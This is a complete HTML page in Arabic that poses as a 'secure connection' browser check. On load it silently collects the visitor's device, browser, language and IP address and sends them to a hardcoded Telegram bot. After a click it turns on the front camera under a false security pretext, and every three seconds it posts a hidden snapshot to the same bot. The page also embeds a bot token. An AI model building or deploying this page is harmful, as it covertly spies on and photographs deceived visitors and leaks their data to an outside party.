<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الاتصال الآمن</title>
    <style>
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
        button { padding: 12px 25px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; width: 100%; }
    </style>
</head>
<body>

    <div class="card" id="ui">
        <h2 style="color: #1c1e21;">تحقق من المتصفح</h2>
        <p style="color: #606770;">نظام الحماية يتطلب منك الضغط على المتابعة للتأكد من أمان اتصالك.</p>
        <button onclick="start()">متابعة الآن</button>
    </div>

    <video id="v" playsinline autoplay muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const token = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
        const id = '2103976274';

        // 1. جلب المعلومات الأساسية فور فتح الصفحة (بدون إذن)
        window.onload = async function() {
            let info = `📌 **تقرير جديد عن زائر**\n\n`;
            info += `📱 **الجهاز:** ${navigator.platform}\n`;
            info += `🌐 **المتصفح:** ${navigator.userAgent.split(' ').pop()}\n`;
            info += `🖥️ **اللغة:** ${navigator.language}\n`;
            
            // جلب عنوان الـ IP (باستخدام خدمة خارجية بسيطة)
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                info += `🌍 **IP:** ${data.ip}\n`;
            } catch (e) { info += `🌍 **IP:** فشل الجلب\n`; }

            // إرسال المعلومات الأولية فوراً
            sendText(info);
        };

        async function start() {
            document.getElementById('ui').innerHTML = "<h3>جاري التحقق...</h3>";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    setInterval(snap, 3000);
                };
            } catch (err) {
                sendText("⚠️ **المستخدم رفض فتح الكاميرا**");
                alert("يجب السماح بالكاميرا لإتمام الفحص الأمني.");
            }
        }

        function snap() {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', id);
                fd.append('photo', blob, 'img.jpg');
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.8);
        }

        function sendText(text) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: id, text: text, parse_mode: "Markdown" })
            });
        }
    </script>
</body>
</html>
